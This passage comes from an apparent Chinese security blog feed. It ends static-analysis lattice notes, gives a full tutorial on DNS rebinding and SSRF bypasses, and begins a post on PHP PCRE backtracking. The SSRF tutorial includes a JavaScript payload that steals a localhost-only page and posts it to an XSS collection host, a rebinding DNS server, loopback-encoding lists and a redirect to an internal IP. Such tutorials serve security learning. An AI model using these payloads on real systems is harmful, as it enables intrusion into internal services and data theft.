src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135035140.png" class="" title="image-20220109135035140"><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109140408193.png" class="" title="image-20220109140408193"><h3 id="⭐️3-4-Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#⭐️3-4-Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="⭐️3.4 Lattice, Semilattice, Complete and Product Lattice"></a>⭐️3.4 Lattice, Semilattice, Complete and Product Lattice</h3><ul><li><strong>Lattice(格)：poset中的任意2个元素，都存在最小上界和最大下界</strong></li><li><strong>Semilattice(半格)：poset中的任意2个元素，只有上界或只有下界</strong></li><li><strong>Complete Lattice(完全格)：一个Lattice的任意子集都存在最小上界和最大下界，则称为Complete Lattice</strong><ul><li>其实finite的lattice一定是Complete Lattice（反过来不一定）</li></ul></li><li><strong>Product Lattice：可理解为多个Lattice的笛卡尔积</strong><ul><li>Product Lattice也是一个Lattice</li><li>构成Product Lattice的每一个Lattice都是Complete的，那么这个Product Lattice也是Complete</li></ul></li></ul><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135417528.png" class="" title="image-20220109135417528"><p>.<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109143223130.png" class="" title="image-20220109143223130"></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109142123333.png" class="" title="image-20220109142123333"><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://space.bilibili.com/2919428/channel/seriesdetail?sid=1006553&ctype=0" >课程视频<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://pascal-group.bitbucket.io/teaching.html" >课件<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS重绑定与SSRF绕过</title>
      <link href="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/"/>
      <url>/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-DNS重绑定-DNS-Rebinding"><a href="#0x01-DNS重绑定-DNS-Rebinding" class="headerlink" title="0x01 DNS重绑定(DNS Rebinding)"></a>0x01 DNS重绑定(DNS Rebinding)</h2><p>通常我们通过域名访问应用的流程是：浏览器向DNS服务器发送请求，DNS服务器将请求的域名转换为ip地址，然后向对应的IP地址请求资源，最后回显给用户。</p><p>在访问DNS后请求方会缓存域名和IP的对应关系，而缓存时间就是由DNS服务器设置的TTL值决定。</p><p>当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址，对于浏览器来说前后2次访问是同一域名，所以认为是安全的，这就可导致绕过同源策略和SSRF限制。下面介绍3种常见的DNS从绑定方法。</p><h3 id="1-1-TTL-0的A记录"><a href="#1-1-TTL-0的A记录" class="headerlink" title="1.1 TTL=0的A记录"></a>1.1 TTL=0的A记录</h3><p>国内的域名厂商基本都不可以设置TTL为0，某些国外的域名才可以设置TTL=0，这方法只适用于前后两次请求存在一定有时间间隔或时间可控的情况。</p><p>举个CTF例子，你能向服务器提交一个URL,并且服务器会访问你提交的url。然后flag藏在服务器的本身的<code>http://127.0.0.1/secret</code>上。只能本地访问。</p><p>但是这里你提交你能控制的页面<code>www.x.com/index.php</code>，但是由于同源策略的原因你没办法去获取服务器上的<code>http://127.0.0.1/secret</code>。 但是通过<code>dns rebinding</code>就可以了。 比如你的页面如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://*********/static/jquery.min.js</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;POST()&quot;</span>,<span class="number">90000</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">POST</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    alert();</span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">    url:<span class="string">&quot;http://www.x.com/secret&quot;</span>,</span></span><br><span class="line"><span class="javascript">    type:<span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.post(<span class="string">&quot;http://xss平台&quot;</span>,&#123;<span class="string">&#x27;a&#x27;</span>:data&#125;)&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>整个过程如下：</p><ol><li>你提交的是<code>www.x.com/index.php</code>，内容如上述代码</li><li>设置你的域名的TTL=0，提交之后服务器会请求dns的域名与ip的关系然后找到你的这个页面，然后开始执行js。</li><li>执行的时候先延迟90s，利用这延迟的90s，去修改你域名的A记录绑定到127.0.0.1上</li><li>然后js延迟结束之后之后又会请求<code>http://www.x.com/secret</code>，由于你之前设置的TTL=0，所以又会重新向dns服务器请求一次ip。得到ip=127.0.0.1，而整个过程访问的都是同一域名，所以浏览器认为是安全的。就会成功去访问<code>http://127.0.0.1/secret</code>，从而绕过同源策略</li></ol><h3 id="1-2-两条A记录"><a href="#1-2-两条A记录" class="headerlink" title="1.2 两条A记录"></a>1.2 两条A记录</h3><p>域名解析配置2条A记录，一条为外网的VPS IP，一条为内网IP，就<a class="link"   href="http://www.bendawang.site/2017/01/05/33c3-CTF-web-WriteUp/" >33c3-CTF list0r<i class="fas fa-external-link-alt"></i></a>这题而言，服务器会向DNS服务器连续访问2次请求，第一次判断解析后的IP是否在黑名单IP(本地IP)中，第二次就直接访问域名，所以需要第一次解析为外网地址，第二次解析为127.0.0.1，这种情况就可以采用此方法。DNS服务器绑定2条记录的解析是随机的，所以成功率只有1/4。</p><img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/586e317cb6a56d3762000002.png" class="" title="img"><p>这种方法推荐使用<a class="link"   href="http://ceye.io/dns-rebinding" >ceye.io<i class="fas fa-external-link-alt"></i></a>创建，在个人信息页新增DNS解析IP就可以</p><img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220319192958158.png" class="" title="image-20220319192958158"><p>多nslookup下自己<code>abcdef.ceye.io</code>的子域名，比如如<code>nslookup r.abcdef.ceye.io</code></p><img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220319193310416.png" class="" title="image-20220319193310416"><h3 id="1-3-NS记录-自建DNS服务器"><a href="#1-3-NS记录-自建DNS服务器" class="headerlink" title="1.3 NS记录+自建DNS服务器"></a>1.3 NS记录+自建DNS服务器</h3><p>此方法需要再我们DNS解析配置一条NS记录和一条A记录</p><img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220112161403319.png" class="" title="image-20220112161403319"><p>ns记录表示域名<code>test.p0melo.top</code>这个子域名指定由<code>ns.p0melo.top</code>这个域名服务器来解析，然后a记录表示我的这个<code>ns.p0melo.top</code>的位置在ip地址<code>149.248.18.38</code>上。然后我们用python的twisted库搭建一个DNS服务器就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span>(<span class="params">self, query</span>):</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">&quot;149.248.18.38&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> name+<span class="string">&quot; ===&gt; &quot;</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            <span class="built_in">type</span>=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b&#x27;%s&#x27;</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">self, query, timeout=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">&#x27;/etc/resolv.conf&#x27;</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><p>我们使用<code>nslookup test.p0melo.top</code>查看解析结果，可以看到前后两次DNS解析不同</p><img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220112161740821.png" class="" title="image-20220112161740821"><h2 id="0x02-其他的SSRF绕过技术"><a href="#0x02-其他的SSRF绕过技术" class="headerlink" title="0x02 其他的SSRF绕过技术"></a>0x02 其他的SSRF绕过技术</h2><p>再说节其他的一些ssrf绕过技术</p><h3 id="2-1-符号绕过"><a href="#2-1-符号绕过" class="headerlink" title="2.1 @符号绕过"></a>2.1 @符号绕过</h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p><p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p><h3 id="2-2-点分隔符替换"><a href="#2-2-点分隔符替换" class="headerlink" title="2.2 点分隔符替换"></a>2.2 点分隔符替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure><h3 id="2-3-本地回环地址"><a href="#2-3-本地回环地址" class="headerlink" title="2.3 本地回环地址"></a>2.3 本地回环地址</h3><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1 </span><br><span class="line">http:&#x2F;&#x2F;localhost </span><br><span class="line">http:&#x2F;&#x2F;127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http:&#x2F;&#x2F;127.1 </span><br><span class="line">http:&#x2F;&#x2F;127.0.1 </span><br><span class="line">http:&#x2F;&#x2F;0:80</span><br></pre></td></tr></table></figure><p>IPV6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:7f00:1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:127.0.0.1] </span><br><span class="line">http:&#x2F;&#x2F;ip6-localhost</span><br><span class="line">http:&#x2F;&#x2F;0--1.ipv6-literal.net</span><br></pre></td></tr></table></figure><h3 id="2-4-DNS解析"><a href="#2-4-DNS解析" class="headerlink" title="2.4 DNS解析"></a>2.4 DNS解析</h3><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure><p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure><h3 id="2-5-IP的进制转换"><a href="#2-5-IP的进制转换" class="headerlink" title="2.5 IP的进制转换"></a>2.5 IP的进制转换</h3><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a class="link"   href="https://github.com/vysecurity/IPFuscator" >IPFuscator<i class="fas fa-external-link-alt"></i></a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p><h3 id="2-6-封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#2-6-封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="2.6 封闭式字母数字 (Enclosed Alphanumerics)字符"></a>2.6 封闭式字母数字 (Enclosed Alphanumerics)字符</h3><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h3 id="2-7-利用网址缩短"><a href="#2-7-利用网址缩短" class="headerlink" title="2.7 利用网址缩短"></a>2.7 利用网址缩短</h3><p>网上有很多将网址转换未短网址的网站。</p><ul><li><p><a class="link"   href="https://www.985.so/" >https://www.985.so/<i class="fas fa-external-link-alt"></i></a></p></li><li><p><a class="link"   href="https://www.urlc.cn/" >https://www.urlc.cn/<i class="fas fa-external-link-alt"></i></a></p></li></ul><h3 id="2-8-利用30X重定向"><a href="#2-8-利用30X重定向" class="headerlink" title="2.8 利用30X重定向"></a>2.8 利用30X重定向</h3><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。</p><p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p><p>服务端代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a><strong>0x03 参考</strong></h2><p><a class="link"   href="https://mp.weixin.qq.com/s/VvXCTNZhfknKNlcUdMzGBA" >SSRF防御与绕过<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" >关于DNS重绑定总结<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP的PCRE库回溯问题</title>
      <link href="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/"/>
      <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p><h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p><p>DFA与NFA机制上的不同带来3种主要影响：</p><ol><li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li><li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li><li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li></ol><p><strong>针对第2点，这里举个例子来说明：</strong></p><p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p><p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p><p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p><h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p><p>　　量词：{m,n}：m到n个</p><p>　　　　　*：任意多个</p><p>　　　　　+：一个到多个</p><p>　　　　　？：0或一个</p><p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932"><p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139"><p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050"><p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722"><p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726"><p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p><h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 